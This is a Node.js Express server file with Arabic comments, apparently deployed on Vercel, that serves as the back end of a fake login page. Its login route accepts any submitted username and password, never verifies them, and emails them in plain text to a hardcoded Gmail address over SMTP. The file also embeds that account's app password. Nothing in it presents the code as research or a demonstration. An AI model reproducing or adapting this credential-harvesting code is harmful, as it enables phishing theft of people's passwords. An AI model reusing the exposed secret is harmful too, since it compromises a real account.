const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();
const port = process.env.PORT; // لا يزال المنفذ يقرأ من متغير البيئة Vercel

// استخدم middleware
app.use(express.json()); // لتحليل بيانات JSON
app.use(cors()); // للسماح بالوصول من مصادر مختلفة

// إعداد Nodemailer باستخدام إعدادات SMTP مباشرة
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com', // اسم خادم SMTP لـ Gmail
    port: 465, // المنفذ القياسي للاتصال الآمن (SSL)
    secure: false, // يجب أن تكون "true" للمنفذ 465
    auth: {
        user: 'maeen.mohammedaldeiry@gmail.com', // تم تعيين البريد الإلكتروني مباشرة
        pass: 'jxal wdvx geyd ioqq', // ضع كلمة مرور التطبيق هنا
    }
});

// مسار (route) للتعامل مع الطلبات العادية على الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send('الخادم يعمل بشكل صحيح. الرجاء استخدام صفحة تسجيل الدخول.');
});

// مسار (route) لمعالجة طلب تسجيل الدخول
app.post('/login-handler', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'اسم المستخدم وكلمة المرور مطلوبان.' });
    }

    // إعداد محتوى رسالة البريد الإلكتروني
    const mailOptions = {
        from: 'maeen.mohammedaldeiry@gmail.com', // تم تعيين البريد الإلكتروني مباشرة
        to: 'maeen.mohammedaldeiry@gmail.com', // يمكنك تعديله لبريد آخر إذا أردت
        subject: 'تم تسجيل دخول جديد',
        html: `
            <h3>بيانات تسجيل الدخول:</h3>
            <p><b>اسم المستخدم:</b> ${username}</p>
            <p><b>كلمة المرور:</b> ${password}</p>
        `
    };

    // إرسال البريد الإلكتروني
    try {
        await transporter.sendMail(mailOptions);
        console.log('تم إرسال البريد بنجاح.');
        res.status(200).json({ success: true, message: 'تم إرسال البيانات بنجاح.' });
    } catch (error) {
        console.error('فشل إرسال البريد:', error);
        res.status(500).json({ success: false, message: 'فشل إرسال البريد الإلكتروني.' });
    }
});

// تشغيل الخادم على المنفذ المحدد من Vercel
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
